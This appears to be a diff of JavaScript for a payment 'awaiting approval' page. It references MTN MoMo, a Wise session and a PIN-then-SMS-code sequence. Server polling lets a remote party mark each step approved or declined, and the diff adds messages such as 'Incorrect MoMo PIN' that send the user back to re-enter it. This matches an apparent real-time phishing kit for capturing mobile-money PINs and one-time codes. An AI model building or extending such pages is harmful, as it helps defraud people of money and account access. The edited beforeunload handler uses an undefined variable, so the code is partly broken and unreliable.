@@ -332,12 +332,6 @@
     note: 'Payment for design services'
   };
 
-  const CURRENCY_INFO = {
-    UGX: 3800, KES: 129, TZS: 2650, RWF: 1400, GHS: 15.5,
-    NGN: 1550, ZAR: 18.5, XOF: 605, XAF: 605, ZMW: 26,
-    MWK: 1730, USD: 1
-  };
-
   const paymentData = (function(){
     try {
       const raw = localStorage.getItem(STORAGE_KEY);
@@ -366,12 +360,12 @@
 
   // ---- Guard: must have a session ----
   if (!session.txnId) {
-    // No transaction found → send back to mtn.html
     window.location.replace('mtn.html');
     return;
   }
 
   const txnId = session.txnId;
+  const stage = new URLSearchParams(window.location.search).get('stage') || 'recipient';
 
   // ---- Helpers ----
   function fmtAmount(n) {
@@ -395,7 +389,6 @@
   const timerInterval = setInterval(() => {
     const elapsed = Math.floor((Date.now() - startedAt) / 1000);
     timerSecs.textContent = elapsed;
-    // Progress bar caps at 60s
     const pct = Math.min(100, (elapsed / 60) * 100);
     progressFill.style.width = pct + '%';
   }, 500);
@@ -429,7 +422,7 @@
       statusBadge.querySelector('.waiting-dots').innerHTML =
         '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
       waitingTitle.textContent = 'Transaction declined';
-      waitingSubtitle.textContent = 'Please check your details and try again.';
+      waitingSubtitle.textContent = 'Incorrect MoMo PIN. Please try again.';
     } else {
       statusBadge.classList.add('pending');
       statusText.textContent = 'Awaiting approval';
@@ -438,47 +431,80 @@
     }
   }
 
+  // ---- Mark session flags before redirect ----
+  function unlockApproved() {
+    try {
+      const s = JSON.parse(sessionStorage.getItem('wise_session') || '{}');
+      if (stage === 'sms') {
+        s.smsApproved = true;
+        s.smsApprovedAt = Date.now();
+        s.stage = 'sms-approved';
+      } else {
+        s.approved = true;
+        s.approvedAt = Date.now();
+        s.stage = 'approved';
+      }
+      sessionStorage.setItem('wise_session', JSON.stringify(s));
+    } catch(e) {}
+  }
+  function clearFlags() {
+    try {
+      const s = JSON.parse(sessionStorage.getItem('wise_session') || '{}');
+      delete s.approved;
+      delete s.smsApproved;
+      delete s.stage;
+      sessionStorage.setItem('wise_session', JSON.stringify(s));
+    } catch(e) {}
+  }
+
   async function checkStatus() {
     try {
-      const res = await fetch(`/api/status/${encodeURIComponent(txnId)}`);
+      const res = await fetch(`/api/status/${encodeURIComponent(txnId)}`, { cache: 'no-store' });
       const data = await res.json();
 
       if (data.status === 'approved') {
         stopPolling();
         setStatus('approved');
-        // Small delay so user sees the success state, then navigate
+        unlockApproved();
+        // Short pause so user sees the "Approved" state, then navigate
         setTimeout(() => {
-          window.location.href = 'sms.html';
+          if (stage === 'sms') {
+            window.location.href = 'verifying.html';
+          } else {
+            window.location.href = 'sms.html';
+          }
         }, 700);
       } else if (data.status === 'declined') {
         stopPolling();
         setStatus('declined');
+        clearFlags();
+        // Short pause so user sees the message, then back to mtn.html with the error
         setTimeout(() => {
-          window.location.href = 'mtn.html';
+          if (stage === 'sms') {
+            window.location.href = 'sms.html?error=wrong_code';
+          } else {
+            window.location.href = 'mtn.html?error=wrong_pin';
+          }
         }, 1600);
       } else {
-        // Still pending — keep polling
         setStatus('pending');
       }
     } catch (err) {
-      // Network error → don't crash, just keep trying
       console.warn('Status check failed:', err.message);
     }
   }
 
-  // First check immediately, then every 1.5s
   checkStatus();
   pollInterval = setInterval(checkStatus, 1500);
 
-  // ---- Fallback: if nothing happens after 90s, show a message ----
+  // ---- Fallback message after 90s ----
   setTimeout(() => {
     if (currentStatus === 'pending') {
       waitingSubtitle.textContent = 'Taking longer than expected. Please wait or refresh the page.';
     }
   }, 90000);
 
-  // ---- Prevent accidental navigation ----
-  window.addEventListener('beforeunload', (e) => {
+  window.addEventListener('beforeunload', () => {
     if (currentStatus === 'pending') {
       e.preventDefault();
       e.returnValue = '';
